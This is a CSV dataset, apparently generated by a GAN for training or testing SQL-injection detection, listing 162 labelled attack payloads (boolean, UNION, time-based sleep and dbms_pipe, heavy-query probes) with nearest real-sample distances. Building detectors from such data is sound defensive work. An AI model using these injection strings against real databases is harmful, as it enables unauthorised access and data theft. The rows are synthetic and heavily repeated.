@@ -1,0 +1,201 @@
+id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
+GAN_000001,attack,boolean,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004668,8.806790771142579
+GAN_000002,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,4.859252589756344
+GAN_000003,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",nearest_attack_euclidean,R007681,4.415459272122306
+GAN_000004,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R002932,7.28943879012905
+GAN_000005,attack,boolean,1'  )   and 4595  =  4595#,nearest_attack_euclidean,R000972,7.950599986665476
+GAN_000006,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003411,4.465104353573239
+GAN_000007,attack,boolean,-8341 or 8571  =  8571--,nearest_attack_euclidean,R001715,6.99525731423241
+GAN_000008,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  5855  =  7142  )   then 1 else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,nearest_attack_euclidean,R008879,8.353208565803206
+GAN_000009,attack,boolean,"1""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006208,5.839886226013157
+GAN_000010,attack,boolean,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",nearest_attack_euclidean,R001217,8.151850037598543
+GAN_000011,attack,boolean,-9556 or   (  2049  =  6967  )  *6967# mhbc,nearest_attack_euclidean,R002502,6.250113157333817
+GAN_000012,attack,boolean,-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,nearest_attack_euclidean,R004209,8.278282413645577
+GAN_000013,attack,boolean,"1'   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001437,7.66412391900159
+GAN_000014,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R008340,7.409439203202862
+GAN_000015,attack,boolean,"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",nearest_attack_euclidean,R006822,10.159264227977822
+GAN_000016,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R005630,6.199207119065197
+GAN_000017,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006423,4.742960897760988
+GAN_000018,attack,boolean,"1'+  (  select wkay where 5476  =  5476 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R004102,7.606098720847292
+GAN_000019,attack,other,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- rucf",nearest_attack_euclidean,R006118,6.496914601268468
+GAN_000020,attack,union,"-7008'   )    )    union all select 9080,9080,9080#",nearest_attack_euclidean,R006574,4.7409959648089135
+GAN_000021,attack,boolean,"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'qvqf'  =  'qvqf",nearest_attack_euclidean,R001554,6.216247898158065
+GAN_000022,attack,boolean,"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001760,4.968766595771166
+GAN_000023,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R002753,6.347391379509325
+GAN_000024,attack,boolean,1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,nearest_attack_euclidean,R007325,6.233731253677746
+GAN_000025,attack,boolean,-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,nearest_attack_euclidean,R007793,5.549424328620128
+GAN_000026,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R003820,4.519790451622699
+GAN_000027,attack,boolean,"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003171,6.691960628609146
+GAN_000028,attack,boolean,"-6505'   )    )    as jtnp where 1037  =  1037 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R003866,6.1289483351277605
+GAN_000029,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R001912,7.893437230038373
+GAN_000030,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000718,6.3288847519874505
+GAN_000031,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R008340,6.715006832610917
+GAN_000032,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R005630,5.7065879574213945
+GAN_000033,attack,union,"1   )    )    union all select null,null,null,null#",nearest_attack_euclidean,R001956,6.9718807745598275
+GAN_000034,attack,boolean,-6433%'   )    )    or 9323  =  9323#,nearest_attack_euclidean,R005844,7.191820730266691
+GAN_000035,attack,boolean,1'  )   and 4595  =  4595#,nearest_attack_euclidean,R000972,8.224107290450835
+GAN_000036,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,6.088436918480547
+GAN_000037,attack,boolean,"1""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R008487,7.213048730346068
+GAN_000038,attack,boolean,"1%""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002629,6.1983502803807555
+GAN_000039,attack,boolean,"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'xwhi'  =  'xwhi",nearest_attack_euclidean,R001265,7.040615315688241
+GAN_000040,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R001912,7.9674626386514005
+GAN_000041,attack,boolean,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",nearest_attack_euclidean,R001217,7.437189983271506
+GAN_000042,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R004115,5.504137404190746
+GAN_000043,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006953,5.203620449744702
+GAN_000044,attack,union,"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",nearest_attack_euclidean,R007373,9.147215567009399
+GAN_000045,attack,boolean,-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--,nearest_attack_euclidean,R003072,7.514230530473604
+GAN_000046,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R003088,7.622623942999537
+GAN_000047,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,8.590876906600379
+GAN_000048,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006423,6.981150948672824
+GAN_000049,attack,union,"-5802'   )    )     )   union all select 6286,6286,6286,6286#",nearest_attack_euclidean,R003946,6.5189528916900175
+GAN_000050,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R006353,8.359703620863877
+GAN_000051,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,5.885974377891618
+GAN_000052,attack,boolean,"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R006540,6.408416948650655
+GAN_000053,attack,boolean,"1%'   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002570,7.484463997103673
+GAN_000054,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R004711,6.806358149126268
+GAN_000055,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,6.185965811006112
+GAN_000056,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R002753,7.248515128377329
+GAN_000057,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R008340,6.711001563636277
+GAN_000058,attack,boolean,"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R006540,8.144267472457614
+GAN_000059,attack,boolean,"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006694,6.228827461978543
+GAN_000060,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R001912,7.182092107235935
+GAN_000061,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R001378,6.36718419393621
+GAN_000062,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,6.464549542788768
+GAN_000063,attack,union,"-7008'   )    )    union all select 9080,9080,9080#",nearest_attack_euclidean,R006574,5.177082258785209
+GAN_000064,attack,boolean,-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,nearest_attack_euclidean,R004209,9.118251421579796
+GAN_000065,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R003224,4.492597640499396
+GAN_000066,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R003224,6.977116015104851
+GAN_000067,attack,boolean,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004668,6.937870629004186
+GAN_000068,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R005877,6.7351951236132654
+GAN_000069,attack,boolean,"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",nearest_attack_euclidean,R006822,8.568074086007432
+GAN_000070,attack,union,"1%"" union all select null,null,null,null,null,null--",nearest_attack_euclidean,R003410,6.669750158167345
+GAN_000071,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,7.1531009391672615
+GAN_000072,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R005630,5.60188129108703
+GAN_000073,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R006637,8.65063014093636
+GAN_000074,attack,boolean,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",nearest_attack_euclidean,R001217,6.7201731194561445
+GAN_000075,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  -- vhmc",nearest_attack_euclidean,R006376,4.879949283846508
+GAN_000076,attack,union,"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",nearest_attack_euclidean,R001713,9.330136896100893
+GAN_000077,attack,boolean,-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--,nearest_attack_euclidean,R003072,9.68581981649007
+GAN_000078,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R004115,7.25920094646596
+GAN_000079,attack,boolean,"1""   )    )    as hkrh where 3060  =  3060 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001828,9.973210640448604
+GAN_000080,attack,boolean,-9556 or   (  2049  =  6967  )  *6967# mhbc,nearest_attack_euclidean,R002502,11.415149978752249
+GAN_000081,attack,time,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,nearest_attack_euclidean,R008368,9.067247644977385
+GAN_000082,attack,union,"1'   )    )     )   union all select null,null,null,null,null#",nearest_attack_euclidean,R001593,6.558098701931238
+GAN_000083,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nhuk'  =  'nhuk",nearest_attack_euclidean,R007948,5.218528960773497
+GAN_000084,attack,union,"-5802'   )    )     )   union all select 6286,6286,6286,6286#",nearest_attack_euclidean,R003946,5.9874785244325395
+GAN_000085,attack,union,"-7008'   )    )    union all select 9080,9080,9080#",nearest_attack_euclidean,R006574,5.039438766744167
+GAN_000086,attack,union,"1'   )    )     )   union all select null,null,null,null,null#",nearest_attack_euclidean,R001593,9.232039315678747
+GAN_000087,attack,boolean,"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R003539,6.254098620790467
+GAN_000088,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R005570,8.944333685126892
+GAN_000089,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,7.541945611353623
+GAN_000090,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R004632,5.904153520217417
+GAN_000091,attack,boolean,"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003883,5.175692499579834
+GAN_000092,attack,boolean,-3821'  )   or 9323  =  9323#,nearest_attack_euclidean,R005732,9.346351782390615
+GAN_000093,attack,other,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- rucf",nearest_attack_euclidean,R006118,7.355213643561589
+GAN_000094,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,7.033842571650902
+GAN_000095,attack,boolean,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004668,8.511256082334322
+GAN_000096,attack,boolean,-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R008049,9.163125435511494
+GAN_000097,attack,other,1'  )   where 4949  =  4949,nearest_attack_euclidean,R003305,5.662954475813757
+GAN_000098,attack,boolean,1'   )    )    and 4595  =  4595#,nearest_attack_euclidean,R005247,8.321276891380913
+GAN_000099,attack,boolean,"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'qtni'  =  'qtni",nearest_attack_euclidean,R007471,9.814104469498263
+GAN_000100,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R008244,5.788923733965567
+GAN_000101,attack,boolean,1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,nearest_attack_euclidean,R007325,5.106517280396967
+GAN_000102,attack,union,"-6554'   )    )     )   union all select 4384,4384,4384,4384,4384#",nearest_attack_euclidean,R002948,6.359850350753655
+GAN_000103,attack,boolean,"1'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'istb'  =  'istb",nearest_attack_euclidean,R006822,8.2167490168592
+GAN_000104,attack,boolean,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R005801,4.539608578333957
+GAN_000105,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,7.894009817962526
+GAN_000106,attack,boolean,"-9356 or elt  (  1032  =  1032,3623  )  -- izgi",nearest_attack_euclidean,R008712,4.475547037439041
+GAN_000107,attack,boolean,"1'+  (  select 'ovti' where 4243  =  4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",nearest_attack_euclidean,R003917,6.39546567185425
+GAN_000108,attack,time,1' and sleep  (  5  )  #,nearest_attack_euclidean,R007832,8.311905784786868
+GAN_000109,attack,boolean,"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'msol'  =  'msol",nearest_attack_euclidean,R008070,7.328401780307895
+GAN_000110,attack,other,1' where 6116  =  6116,nearest_attack_euclidean,R001565,7.494991826442007
+GAN_000111,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R002381,5.005621147750023
+GAN_000112,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R004115,6.04066884052414
+GAN_000113,attack,boolean,1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,nearest_attack_euclidean,R007325,6.088546163923712
+GAN_000114,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,5.671780281568665
+GAN_000115,attack,boolean,-3496'   )    )    or 9323  =  9323#,nearest_attack_euclidean,R002318,10.77656602865286
+GAN_000116,attack,union,"1  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R002147,7.006815648771407
+GAN_000117,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006423,5.522484038789737
+GAN_000118,attack,boolean,-1468'   )    )     )   or 4875  =  6163#,nearest_attack_euclidean,R003248,11.828197777803833
+GAN_000119,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",nearest_attack_euclidean,R001093,6.427428251198303
+GAN_000120,attack,boolean,1'  )   and 4595  =  4595#,nearest_attack_euclidean,R000972,8.363491922642913
+GAN_000121,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,5.586789603812593
+GAN_000122,attack,boolean,-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,nearest_attack_euclidean,R007793,6.7481852668279405
+GAN_000123,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,5.946639286750231
+GAN_000124,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",nearest_attack_euclidean,R003361,7.545576977467404
+GAN_000125,attack,boolean,"1""  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R004901,6.934250853929819
+GAN_000126,attack,boolean,"1'   )    )    as jpxj where 6153  =  6153 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004056,9.572383508440714
+GAN_000127,attack,boolean,"-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr",nearest_attack_euclidean,R003794,5.472894952155911
+GAN_000128,attack,boolean,1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,nearest_attack_euclidean,R007325,7.171597625256832
+GAN_000129,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R001912,7.931719913084128
+GAN_000130,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R008244,4.368601727795567
+GAN_000131,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R001912,9.590461505708051
+GAN_000132,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R003224,6.427254138187465
+GAN_000133,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000718,7.079364994611922
+GAN_000134,attack,boolean,"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'dbsm'  =  'dbsm",nearest_attack_euclidean,R008460,5.986936250787941
+GAN_000135,attack,boolean,-2866'   )    )    or 4491  =  9429#,nearest_attack_euclidean,R004269,5.302555863889083
+GAN_000136,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R005630,7.206598214726427
+GAN_000137,attack,boolean,"1%""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002629,6.963078331151393
+GAN_000138,attack,boolean,"1' in boolean mode  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R000780,8.23275904897232
+GAN_000139,attack,boolean,"1' in boolean mode  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R005037,7.212119092401266
+GAN_000140,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R008526,5.098886828788693
+GAN_000141,attack,union,"1   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R008602,6.60434375541241
+GAN_000142,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R001976,9.43391340405514
+GAN_000143,attack,boolean,"-8144'  )   where 1691  =  1691 or elt  (  7246  =  7816,7816  )  --",nearest_attack_euclidean,R005077,9.459268792783456
+GAN_000144,attack,boolean,"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R005500,5.00016563799341
+GAN_000145,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R003086,5.0298514956787095
+GAN_000146,attack,boolean,"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003883,5.915012449750175
+GAN_000147,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R006054,6.063371918997113
+GAN_000148,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R005293,4.916242909106688
+GAN_000149,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R002932,5.8826153074200445
+GAN_000150,attack,boolean,-3496'   )    )    or 9323  =  9323#,nearest_attack_euclidean,R002318,8.49129406795155
+GAN_000151,attack,boolean,"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002148,4.937035054122725
+GAN_000152,attack,boolean,-7941 or   (  5822  =  8754  )  *8754-- eepn,nearest_attack_euclidean,R001200,7.446792652566753
+GAN_000153,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006953,3.8401164880935803
+GAN_000154,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R004632,6.254073889449422
+GAN_000155,attack,boolean,"1""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R008487,7.6658546212456
+GAN_000156,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,4.791491671857076
+GAN_000157,attack,boolean,1' and 4595  =  4595#,nearest_attack_euclidean,R006724,11.95523935179852
+GAN_000158,attack,boolean,"1%""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R005184,6.449649305261902
+GAN_000159,attack,boolean,"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001268,5.9942483984042925
+GAN_000160,attack,union,"-3902'   )    )     )   union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",nearest_attack_euclidean,R007121,8.43901362114509
+GAN_000161,attack,boolean,-9556 or   (  2049  =  6967  )  *6967# mhbc,nearest_attack_euclidean,R002502,6.292092945720003
+GAN_000162,attack,boolean,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004668,8.264551096963041
